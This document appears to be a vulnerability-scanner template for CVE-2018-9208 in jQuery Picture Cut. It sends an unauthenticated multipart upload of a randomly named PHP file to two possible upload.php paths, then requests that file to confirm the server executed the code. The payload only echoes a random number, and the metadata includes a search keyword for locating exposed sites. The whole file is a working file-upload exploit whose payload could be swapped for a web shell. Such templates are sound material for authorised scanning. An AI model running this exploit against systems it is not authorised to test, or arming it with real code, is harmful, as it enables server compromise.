name: poc-yaml-jquery-picture-cut-upload-php-fileupload-cve-2018-9208
manual: true
transport: http
set:
    r1: randomLowercase(4)
    r2: randomInt(4000000, 4888888)
rules:
    r10:
        request:
            cache: true
            method: POST
            path: /jquery-picture-cut/src/php/upload.php
            headers:
                Content-Type: multipart/form-data; boundary=------------------------05c12974f0da8213
            body: "--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"inputOfFile\"\r\n\nfile\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"request\"\r\n\nupload\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"enableResize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"minimumWidthToResize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"minimumHeightToResize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"folderOnServer\"\r\n\n/\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"imageNameRandom\"\r\n\n1\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"maximumSize\"\r\n\n10000\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"enableMaximumSize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\nContent-Type: application/octet-stream\r\n\n<?php echo {{r2}};?>\r\n--------------------------05c12974f0da8213--\r\n"
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1))) && response.body.bcontains(b".php")
    r11:
        request:
            cache: true
            method: GET
            path: /{{r1}}.php
        expression: response.status == 200 && response.body.bcontains(bytes(string(r2)))
    r20:
        request:
            cache: true
            method: POST
            path: /src/php/upload.php
            headers:
                Content-Type: multipart/form-data; boundary=------------------------05c12974f0da8213
            body: "--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"inputOfFile\"\r\n\nfile\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"request\"\r\n\nupload\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"enableResize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"minimumWidthToResize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"minimumHeightToResize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"folderOnServer\"\r\n\n/\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"imageNameRandom\"\r\n\n1\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"maximumSize\"\r\n\n10000\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"enableMaximumSize\"\r\n\n0\r\n--------------------------05c12974f0da8213\r\nContent-Disposition: form-data; name=\"file\"; filename=\"{{r1}}.php\"\r\nContent-Type: application/octet-stream\r\n\n<?php echo {{r2}};?>\r\n--------------------------05c12974f0da8213--\r\n"
        expression: response.status == 200 && response.body.bcontains(bytes(string(r1))) && response.body.bcontains(b".php")
    r21:
        request:
            cache: true
            method: GET
            path: /{{r1}}.php
        expression: response.status == 200 && response.body.bcontains(bytes(string(r2)))
expression: r10() && r11() || r20() && r21()
detail:
    author: cysec
    links:
        - https://cn-sec.com/archives/914273.html
        - https://nvd.nist.gov/vuln/detail/cve-2018-9208
    vulnerability:
        id: CT-55655
        level: critical
    fofakeyword: title="jQuery"
    warning: 注意该脚本会上传文件产生一个临时的无害文件
